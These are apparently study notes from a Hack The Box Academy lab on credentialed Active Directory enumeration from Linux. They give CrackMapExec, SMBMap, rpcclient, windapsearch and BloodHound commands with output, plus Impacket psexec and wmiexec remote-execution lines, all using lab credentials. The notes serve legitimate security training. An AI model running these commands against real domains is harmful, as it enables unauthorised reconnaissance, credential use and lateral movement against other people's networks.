# Credentialed Enumeration from Linux

## CrackMapExec

### Domain Users

```sh
htb-student@ea-attack01:~$ sudo crackmapexec smb 172.16.5.5 -u 'forend' -p 'Klmcargo2' --users
```

### Domain Groups

```sh
htb-student@ea-attack01:~$ sudo crackmapexec smb 172.16.5.5 -u 'forend' -p 'Klmcargo2' --groups
```

### Logged on Users

```sh
htb-student@ea-attack01:~$ sudo crackmapexec smb 172.16.5.130 -u 'forend' -p 'Klmcargo2' --loggedon-users
```

```output title="Output" hl_lines="5"
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\backupagent               logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\backupagent               logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\damundsen                 logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\ACADEMY-EA-FILE$
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\ACADEMY-EA-FILE$
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\damundsen                 logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\ACADEMY-EA-FILE$
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\ACADEMY-EA-FILE$
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\ACADEMY-EA-FILE$
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\ACADEMY-EA-FILE$
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\ACADEMY-EA-FILE$
```

### Shares

```sh
htb-student@ea-attack01:~$ sudo crackmapexec smb 172.16.5.5 -u 'forend' -p 'Klmcargo2' --shares
```

```output title="Output" hl_lines="8 12 13"
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share             Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----             -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                            Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                                Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$              READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON          READ            Logon server share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL            READ            Logon server share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares       READ
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive       READ
```

### Shares SPIDER_PLUS

```sh
htb-student@ea-attack01:~$ sudo crackmapexec smb 172.16.5.5 -u 'forend' -p 'Klmcargo2' -M spider_plus
```

```output title="Output" hl_lines="7"
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
```

## [SMBMap](https://github.com/ShawnDEvans/smbmap)

### Share Listing

```sh
htb-student@ea-attack01:~$ smbmap -H 172.16.5.5 -d INLANEFREIGHT.LOCAL -u 'forend' -p 'Klmcargo2'
```

```output title="Output" hl_lines="6 10 11"
[+] IP: 172.16.5.5:445  Name: inlanefreight.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        User Shares                                             READ ONLY
        ZZZ_archive                                             READ ONLY
```

### Recursive Share Listing

```sh
htb-student@ea-attack01:~$ smbmap -H 172.16.5.5 -d INLANEFREIGHT.LOCAL -u 'forend' -p 'Klmcargo2' -r 'User Shares' --dir-only
```

```output title="Output"
[+] IP: 172.16.5.5:445  Name: inlanefreight.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        User Shares                                             READ ONLY
        .\User Shares\*
        dr--r--r--                0 Thu Mar 31 14:09:33 2022    .
        dr--r--r--                0 Thu Mar 31 14:09:33 2022    ..
        dr--r--r--                0 Thu Mar 31 14:09:33 2022    Private
        dr--r--r--                0 Thu Mar 31 14:09:33 2022    Public
```

## rpcclient

### User Enumeration

```sh
htb-student@ea-attack01:~$ rpcclient -U "forend%Klmcargo2" 172.16.5.5 -c "enumdomusers"
```

### User Query

| VALUE | ACCOUNT CONTROL BIT | MEANING |
|---|---|---|
| 0x00000010 | [ACB_NORMAL](https://github.com/zentyal/samba/blob/master/librpc/idl/samr.idl#L26) | Normal user account |
| 0x00000200 | [ACB_PWNOEXP](https://github.com/zentyal/samba/blob/master/librpc/idl/samr.idl#L31) | User password does not expire |

```sh
htb-student@ea-attack01:~$ rpcclient -U "forend%Klmcargo2" 172.16.5.5 -c "queryuser 0x49d"
```

```output title="Output" hl_lines="20"
User Name   :   wley
Full Name   :   William Ley
Home Drive  :
Dir Drive   :
Profile Path:
Logon Script:
Description :
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Fri, 23 May 2025 19:57:00 EDT
Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
Password last set Time   :      Mon, 28 Feb 2022 00:45:49 EST
Password can change Time :      Tue, 01 Mar 2022 00:45:49 EST
Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
unknown_2[0..31]...
user_rid :      0x49d
group_rid:      0x201
acb_info :      0x00000210
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00006a2d
padding1[0..7]...
logon_hrs[0..21]...
```

## Impacket

### psexec

```sh
htb-student@ea-attack01:~$ psexec.py 'INLANEFREIGHT.LOCAL'/'wley':'transporter@4'@172.16.5.130
```

### wmiexec

```sh
htb-student@ea-attack01:~$ wmiexec.py 'INLANEFREIGHT.LOCAL'/'wley':'transporter@4'@172.16.5.130
```

## windapsearch

### Domain Administrators

```sh
htb-student@ea-attack01:~$ windapsearch.py --dc-ip 172.16.5.5 -d INLANEFREIGHT.LOCAL -u 'forend@inlanefreight.local' -p 'Klmcargo2' --da
```

### Privileged Users

```sh
htb-student@ea-attack01:~$ windapsearch.py --dc-ip 172.16.5.5 -d INLANEFREIGHT.LOCAL -u 'forend@inlanefreight.local' -p 'Klmcargo2' --privileged-users
```

## BloodHound

### Gathering Data

```sh
htb-student@ea-attack01:~$ bloodhound-python -d INLANEFREIGHT.LOCAL -u 'forend' -p 'Klmcargo2' --nameserver 172.16.5.5 -c All
```

### Zip Output Files

```sh
htb-student@ea-attack01:~$ zip -r inlanefreight.zip *.json
```
